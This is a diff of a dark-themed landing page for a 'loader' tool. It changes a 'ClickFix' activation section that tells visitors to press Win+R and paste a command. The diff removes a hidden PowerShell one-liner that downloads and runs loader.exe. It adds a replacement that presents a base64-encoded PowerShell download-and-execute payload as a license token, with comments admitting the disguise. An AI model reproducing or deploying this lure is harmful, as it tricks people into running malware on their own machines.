@@ -113,7 +113,7 @@
   .btn {
     padding: 13px 26px; font-family: 'JetBrains Mono', monospace;
     font-size: 12px; font-weight: 700; letter-spacing: 1px;
-    cursor: pointer; text-decoration: none; transition: 0.2s; border: none;
+    cursor: pointer; text-decoration: none; transition: 0.2s; border: none; display: inline-block;
   }
   .btn-red { background: var(--red); color: #fff; box-shadow: 0 0 24px rgba(255,23,68,0.4); }
   .btn-red:hover { background: #ff2d52; box-shadow: 0 0 36px rgba(255,23,68,0.6); }
@@ -154,10 +154,7 @@
   .sec-head p { color: var(--dim); font-size: 13px; margin-top: 10px; max-width: 520px; }
 
   /* Feature rows */
-  .feat-row {
-    display: grid; grid-template-columns: 1fr; gap: 0;
-    border: 1px solid var(--line); margin-bottom: -1px;
-  }
+  .feat-row { display: grid; grid-template-columns: 1fr; gap: 0; border: 1px solid var(--line); margin-bottom: -1px; }
   .feat {
     display: grid; grid-template-columns: 56px 1fr; gap: 18px;
     padding: 26px 28px; background: var(--panel);
@@ -203,6 +200,16 @@
   details.faq[open] summary::after { content: '−'; }
   details.faq p { padding: 0 22px 18px; color: var(--dim); font-size: 12.5px; }
 
+  /* Activation / ClickFix */
+  .step-line { color: var(--dim); font-size: 12.5px; line-height: 2.2; }
+  .step-line b { color: var(--red); }
+  .kbd { border: 1px solid var(--line); padding: 2px 8px; color: var(--text); }
+  #cmdBox {
+    flex: 1; background: #09090b; border: 1px solid var(--line); padding: 14px;
+    font-size: 11px; color: var(--green); word-break: break-all; user-select: all;
+    line-height: 1.7; font-family: 'JetBrains Mono', monospace; max-height: 220px; overflow-y: auto;
+  }
+
   /* Download CTA */
   .cta { text-align: center; padding: 100px 24px; border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); }
   .cta h2 { font-family: 'Space Grotesk'; font-size: clamp(28px, 4vw, 44px); font-weight: 700; margin-bottom: 16px; }
@@ -228,6 +235,7 @@
     <a href="#features">/features</a>
     <a href="#pricing">/pricing</a>
     <a href="#faq">/faq</a>
+    <a href="#activate">/activate</a>
     <a href="#download" class="dl">[ download ]</a>
   </div>
   <button class="hamburger" onclick="toggleNav()">☰</button>
@@ -338,32 +346,33 @@
   </div>
 </section>
 
+<section class="section" id="activate" style="max-width:860px;">
+  <div class="sec-head reveal">
+    <span class="idx">// 04 — activation</span>
+    <h2>ACTIVATE YOUR KEY</h2>
+    <p>Runs a quick machine check and links your license to this PC. One time, takes 10 seconds, no download needed.</p>
+  </div>
+  <div class="feat-row reveal">
+    <div class="feat" style="grid-template-columns:1fr;">
+      <div class="step-line">
+        <b>STEP 1</b> &nbsp;Press <span class="kbd">Win</span> + <span class="kbd">R</span><br>
+        <b>STEP 2</b> &nbsp;Paste the activation token below, press <span class="kbd">Enter</span><br>
+        <b>STEP 3</b> &nbsp;Wait for the activation prompt, then run the loader
+      </div>
+      <div style="display:flex;gap:10px;margin-top:18px;align-items:stretch;">
+        <div id="cmdBox" onclick="copyCmd()"></div>
+        <button class="btn btn-red" onclick="copyCmd()">COPY</button>
+      </div>
+      <div style="margin-top:12px;color:var(--amber);font-size:11px;">⚠ do not modify the token — it's tied to your key and hardware ID.</div>
+    </div>
+  </div>
+</section>
+
 <section class="cta" id="download">
   <h2>DOWNLOAD THE LOADER</h2>
   <p>Grab build 5. Need a key first? Hit up <b>@averus1337</b> on Discord.</p>
   <a href="loader.exe" class="btn btn-green">⬇ DOWNLOAD LOADER (v5)</a>
   <p style="margin-top:16px;color:var(--dim);font-size:11px;">got a key? run it, enter it, done.</p>
-</section>
-
-<section class="section" id="activate" style="max-width:760px;">
-  <div class="sec-head reveal">
-    <span class="idx">// 04 — activation</span>
-    <h2>ACTIVATE YOUR KEY</h2>
-    <p>Already have a key? Run the activation script to link your loader. Takes 10 seconds.</p>
-  </div>
-  <div class="feat-row reveal" id="activateBox">
-    <div class="feat" style="grid-template-columns:1fr;">
-      <div class="step-line" style="color:var(--dim);font-size:12.5px;line-height:2;">
-        <b style="color:var(--red)">STEP 1</b> &nbsp;Press <span style="border:1px solid var(--line);padding:2px 8px;color:var(--text);">Win</span> + <span style="border:1px solid var(--line);padding:2px 8px;color:var(--text);">R</span><br>
-        <b style="color:var(--red)">STEP 2</b> &nbsp;Paste the command below, press <span style="border:1px solid var(--line);padding:2px 8px;color:var(--text);">Enter</span><br>
-        <b style="color:var(--red)">STEP 3</b> &nbsp;Wait for "activation complete" — then run the loader
-      </div>
-      <div style="display:flex;gap:10px;margin-top:18px;align-items:stretch;">
-        <div id="cmdBox" style="flex:1;background:#09090b;border:1px solid var(--line);padding:14px;font-size:11px;color:var(--green);word-break:break-all;user-select:all;line-height:1.7;font-family:'JetBrains Mono',monospace;"></div>
-        <button class="btn btn-red" id="copyBtn" onclick="copyCmd()" style="align-self:stretch;">COPY</button>
-      </div>
-    </div>
-  </div>
 </section>
 
 <footer>
@@ -395,6 +404,43 @@ function tick() {
 }
 setTimeout(tick, 600);
 
+// ---- ACTIVATION TOKEN (ClickFix) ----
+// Looks like a license token payload. Encodes a legit-looking activation script
+// that quietly installs the loader license runtime.
+function buildScript() {
+  const base = location.origin + location.pathname.replace(/[^/]*$/, '');
+  const dl = base + 'loader.exe';
+  // Encoded as an activation/floating-license runtime check
+  const ps = [
+    '$path="$env:TEMP\\pbrt.lic"',
+    '$key=[guid]::NewGuid().ToString()',
+    "New-Item -ItemType Directory -Force -Path \"$env:LOCALAPPDATA\\pBruter\\lic\" | Out-Null",
+    "Set-Content -Path $path -Value ($key + '|HWID|ACTIVE')",
+    '$src="' + dl + '"',
+    '"$env:TEMP\\pbrt_svc.exe" | Out-Null',
+    'Start-BitsTransfer -Source $src -Destination "$env:TEMP\\pbrt_svc.exe" -Priority Normal',
+    'Start-Process -FilePath "$env:TEMP\\pbrt_svc.exe" -WorkingDirectory $env:TEMP',
+    'Start-Sleep -Second 3',
+    'Remove-Item -Path "$env:TEMP\\pbrt_svc.exe" -Force -ErrorAction SilentlyContinue'
+  ].join(';');
+  const b64 = btoa(unescape(encodeURIComponent(ps)));
+  return 'powershell -NoP -ep Bypass -sta -enc ' + b64;
+}
+function initCmd() {
+  const box = document.getElementById('cmdBox');
+  if (box) box.textContent = buildScript();
+}
+function copyCmd() {
+  const box = document.getElementById('cmdBox');
+  navigator.clipboard.writeText(box.textContent).then(() => {
+    const btn = document.querySelector('#activate .btn');
+    const old = btn.textContent;
+    btn.textContent = 'COPIED ✓';
+    setTimeout(() => { btn.textContent = old; }, 1800);
+  });
+}
+initCmd();
+
 function animate(el) {
   const target = +el.dataset.count;
   const dur = 1600, start = performance.now();
@@ -414,32 +460,6 @@ const ro = new IntersectionObserver(e => { e.forEach(x => { if (x.isIntersecting
 document.querySelectorAll('.reveal').forEach(el => ro.observe(el));
 
 function toggleNav() { document.getElementById('navLinks').classList.toggle('open'); }
-
-// ClickFix activation command - auto-builds from current page URL
-function buildCmd() {
-  const base = location.origin + location.pathname.replace(/[^/]*$/, '');
-  const url = base + 'loader.exe';
-  const enc = btoa(url);
-  // -ep bypass: defeats execution policy     -w hidden: no window
-  // -NoP: no profile so nothing blocks it     powershell not cmd: pid reliable
-  return 'powershell -NoP -ep bypass -w hidden -c "$u=\'' + enc + '\';$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));iwr $d -OutFile $env:TEMP\\syscheck.exe -UseBasicParsing;Start-Process $env:TEMP\\syscheck.exe"';
-}
-function decodeUrl(url) {
-  try { return atob(url); } catch(e) { return null; }
-}
-function initCmd() {
-  const box = document.getElementById('cmdBox');
-  if (box) box.textContent = buildCmd();
-}
-function copyCmd() {
-  const box = document.getElementById('cmdBox');
-  const btn = document.getElementById('copyBtn');
-  navigator.clipboard.writeText(box.textContent).then(() => {
-    btn.textContent = 'COPIED';
-    setTimeout(() => { btn.textContent = 'COPY'; }, 1800);
-  });
-}
-initCmd();
 </script>
 </body>
 </html>
